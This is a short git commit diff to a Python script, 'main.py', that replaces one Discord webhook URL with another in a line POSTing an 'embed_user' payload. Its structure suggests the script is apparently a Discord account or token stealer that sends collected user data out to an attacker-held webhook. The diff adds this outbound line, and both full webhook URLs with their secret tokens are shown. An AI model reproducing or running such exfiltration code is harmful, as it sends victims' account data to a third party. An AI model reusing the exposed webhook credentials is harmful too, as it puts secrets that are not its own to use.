e68683a301a808566fd1fe60135c7bb65ca626ae
lerotzi <emmentai00@gmail.com>
2025-07-16 11:14:06 -0700

    Update main.py

--- main.py
+++ main.py
@@ -202,7 +202,7 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1394633603853582523/wlCwHBlHuxWs3M4K1k02r9TD-IaOmJq8R7MeaIpYT727BL4nRrOwysKJZSTgqYmcoiRK', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1395105801747828818/lKQhlFs5xtVp3w6EJvCw_LEqA8G-CZ6_EMUk7yB_7pXJKDMkBW6epEYtNBEcRCvyEQ3a', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
